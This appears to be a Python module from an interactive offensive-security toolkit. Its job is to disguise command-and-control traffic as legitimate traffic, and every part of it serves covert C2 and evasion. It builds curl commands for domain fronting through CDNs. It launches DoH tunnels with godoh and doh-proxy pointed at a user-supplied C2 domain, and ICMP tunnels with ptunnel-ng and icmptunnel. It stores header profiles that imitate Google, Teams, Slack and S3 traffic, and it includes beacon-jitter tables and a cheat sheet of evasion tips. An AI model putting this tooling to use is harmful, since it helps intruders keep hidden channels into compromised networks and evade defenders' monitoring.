"""Traffic Blender Module - Disguise C2 traffic as legitimate: domain fronting, DoH, ICMP tunnels."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "traffic_blend"

# Malleable C2 profile templates
MALLEABLE_PROFILES = {
    "Google": {
        "desc": "Mimic Google search traffic",
        "headers": {"Host": "www.google.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        "uri": "/search?q=",
        "content_type": "text/html",
    },
    "Microsoft Teams": {
        "desc": "Mimic Teams API calls",
        "headers": {"Host": "teams.microsoft.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        "uri": "/api/mt/part/emea-03/",
        "content_type": "application/json",
    },
    "Slack": {
        "desc": "Mimic Slack webhook traffic",
        "headers": {"Host": "hooks.slack.com", "User-Agent": "Slackbot 1.0"},
        "uri": "/services/",
        "content_type": "application/json",
    },
    "AWS S3": {
        "desc": "Mimic S3 bucket requests",
        "headers": {"Host": "s3.amazonaws.com", "User-Agent": "aws-sdk-java/1.12.0"},
        "uri": "/bucket/",
        "content_type": "application/xml",
    },
}


def _domain_fronting(session):
    """Domain fronting setup and testing."""
    info("Domain fronting: Use a trusted CDN domain in SNI/Host header while routing to your C2.")

    options = [
        ("1", "[bold]Test fronting[/bold]   - Verify domain front works"),
        ("2", "[bold]CloudFront[/bold]      - AWS CloudFront setup guide"),
        ("3", "[bold]Azure CDN[/bold]       - Azure CDN setup guide"),
        ("4", "[bold]Google CDN[/bold]      - Google Cloud CDN guide"),
    ]
    choice = show_menu(options)

    if choice == "1":
        cdn_domain = ask("Enter CDN domain (e.g., d1234.cloudfront.net)")
        real_host = ask("Enter your real C2 host header")
        cmd = f'curl -sk -H "Host: {real_host}" https://{cdn_domain}/ -v 2>&1 | head -30'
        run_with_preview(cmd, session, STAGE)

    elif choice == "2":
        info("""AWS CloudFront Domain Fronting:
1. Create CloudFront distribution pointing to your C2
2. In C2 client: Set SNI to legitimate-site.cloudfront.net
3. Set Host header to your-c2.cloudfront.net
4. Traffic appears to go to legitimate site

Note: AWS has partially blocked this. Test before relying on it.""")

    elif choice == "3":
        info("""Azure CDN Domain Fronting:
1. Create Azure CDN profile with custom origin (your C2)
2. Use azureedge.net domain as front
3. Set Host header to your-c2.azureedge.net
4. SNI shows generic azureedge.net domain""")

    elif choice == "4":
        info("""Google Cloud CDN:
1. Use Google Cloud Storage + CDN
2. Front domain: storage.googleapis.com
3. Route traffic through Google's infrastructure""")


def _doh_tunnel(session):
    """DNS-over-HTTPS tunneling for covert C2."""
    options = [
        ("1", "[bold]doh-proxy[/bold]      - DoH tunnel client"),
        ("2", "[bold]dnscrypt-proxy[/bold]  - Encrypted DNS proxy"),
        ("3", "[bold]godoh[/bold]           - GoDoH C2 over DoH"),
        ("4", "[bold]Manual DoH test[/bold] - Test DoH resolution"),
    ]
    choice = show_menu(options)

    if choice == "1":
        server = ask("Enter DoH server URL", default="https://dns.google/dns-query")
        cmd = f"doh-proxy --domain c2.example.com --server {server}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "2":
        cmd = "dnscrypt-proxy -resolve example.com"
        run_with_preview(cmd, session, STAGE)
    elif choice == "3":
        domain = ask("Enter C2 domain")
        provider = ask("DoH provider", default="https://dns.google/dns-query")
        cmd = f"godoh --domain {domain} --provider {provider}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "4":
        domain = ask("Enter domain to resolve")
        cmd = f'curl -sH "accept: application/dns-json" "https://dns.google/resolve?name={domain}&type=A"'
        run_with_preview(cmd, session, STAGE)


def _icmp_tunnel(session):
    """ICMP tunneling for covert data exfiltration."""
    options = [
        ("1", "[bold]ptunnel-ng Server[/bold] - Start ICMP proxy server"),
        ("2", "[bold]ptunnel-ng Client[/bold] - Connect to ICMP proxy"),
        ("3", "[bold]icmptunnel[/bold]        - IP-over-ICMP tunnel"),
    ]
    choice = show_menu(options)

    if choice == "1":
        cmd = "ptunnel-ng -s"
        info("Server will listen for ICMP tunnel connections.")
        run_with_preview(cmd, session, STAGE)
    elif choice == "2":
        server = ask("Enter ICMP tunnel server IP")
        dest = ask("Enter destination (e.g., 127.0.0.1)")
        dport = ask("Enter destination port", default="22")
        lport = ask("Enter local listen port", default="8022")
        cmd = f"ptunnel-ng -p {server} -lp {lport} -da {dest} -dp {dport}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "3":
        options2 = [
            ("1", "[bold]Server[/bold]"),
            ("2", "[bold]Client[/bold]"),
        ]
        mode = show_menu(options2)
        if mode == "1":
            cmd = "icmptunnel -s 10.0.0.1"
            run_with_preview(cmd, session, STAGE)
        elif mode == "2":
            server = ask("Enter server IP")
            cmd = f"icmptunnel {server}"
            run_with_preview(cmd, session, STAGE)


def _malleable_profile(session):
    """Generate malleable C2 traffic profiles."""
    info("Select traffic profile to mimic:")

    options = [(str(i+1), f"[bold]{name}[/bold] - {p['desc']}") for i, (name, p) in enumerate(MALLEABLE_PROFILES.items())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    profiles = list(MALLEABLE_PROFILES.items())
    if 0 <= idx < len(profiles):
        name, profile = profiles[idx]

        console.print(f"\n[bold cyan]Traffic Profile: {name}[/bold cyan]\n")
        console.print(f"  URI Pattern:    [green]{profile['uri']}[/green]")
        console.print(f"  Content-Type:   [green]{profile['content_type']}[/green]")
        for k, v in profile['headers'].items():
            console.print(f"  Header {k}: [green]{v}[/green]")

        console.print(f"\n[yellow]Example curl command:[/yellow]")
        headers = ' '.join(f'-H "{k}: {v}"' for k, v in profile['headers'].items())
        c2_url = ask("Enter your C2 URL")
        if c2_url:
            cmd = f'curl -sk {headers} -H "Content-Type: {profile["content_type"]}" {c2_url}{profile["uri"]}'
            console.print(f"  [dim]{cmd}[/dim]")


def _traffic_shaping(session):
    """Shape traffic timing to evade detection."""
    info("Traffic shaping: randomize beacon intervals and jitter.")

    from rich.table import Table
    table = Table(title="Recommended C2 Profiles", show_header=True)
    table.add_column("Profile", style="cyan")
    table.add_column("Beacon", style="bold")
    table.add_column("Jitter", style="bold")
    table.add_column("Use Case")

    table.add_row("Aggressive", "1-5s", "10%", "Active exploitation phase")
    table.add_row("Normal", "30-60s", "25%", "Standard operations")
    table.add_row("Low & Slow", "5-15min", "50%", "Long-term persistence")
    table.add_row("Paranoid", "1-4hr", "75%", "APT-style stealth")

    console.print(table)


def _cheat_sheet():
    """Traffic blending cheat sheet."""
    content = """# Traffic Blending Cheat Sheet

## Domain Fronting
- Use trusted CDN domain (cloudfront.net, azureedge.net)
- SNI shows trusted domain, Host header routes to C2
- Partially blocked by AWS/Google, still works on some CDNs

## DNS Tunneling
```
# DNS-over-HTTPS (hardest to detect)
curl -sH "accept: application/dns-json" "https://dns.google/resolve?name=c2.example.com"

# ICMP tunneling
ptunnel-ng -p server_ip -lp 8022 -da 127.0.0.1 -dp 22
```

## Traffic Mimicry
- Match User-Agent to target environment
- Use HTTPS with valid certificates
- Beacon at irregular intervals (jitter)
- Make payload size match normal traffic

## Evasion Tips
1. Use legitimate cloud services (S3, Azure Blob, GCS)
2. Encrypt payload within normal-looking HTTP body
3. Rotate domains and IPs
4. Match business hours for beaconing
5. Use HTTP/2 or WebSocket for less conspicuous channels

## Tools: ptunnel-ng, icmptunnel, dnscat2, godoh, iodine
"""
    show_knowledge(content)


def run(session):
    """Traffic Blender module entry point."""
    show_stage_header("Traffic Blender", "Disguise C2 traffic as legitimate — domain fronting, DoH, ICMP tunnels")

    while True:
        options = [
            ("1", "[bold]Domain Fronting[/bold]  - CDN-based traffic disguise"),
            ("2", "[bold]DoH Tunnel[/bold]      - DNS-over-HTTPS tunneling"),
            ("3", "[bold]ICMP Tunnel[/bold]     - ICMP covert channel"),
            ("4", "[bold]C2 Profiles[/bold]     - Malleable traffic profiles"),
            ("5", "[bold]Traffic Shaping[/bold]  - Beacon timing & jitter"),
            ("6", "[bold]Cheat Sheet[/bold]     - Traffic blending reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _domain_fronting(session)
        elif choice == "2":
            _doh_tunnel(session)
        elif choice == "3":
            _icmp_tunnel(session)
        elif choice == "4":
            _malleable_profile(session)
        elif choice == "5":
            _traffic_shaping(session)
        elif choice == "6":
            _cheat_sheet()
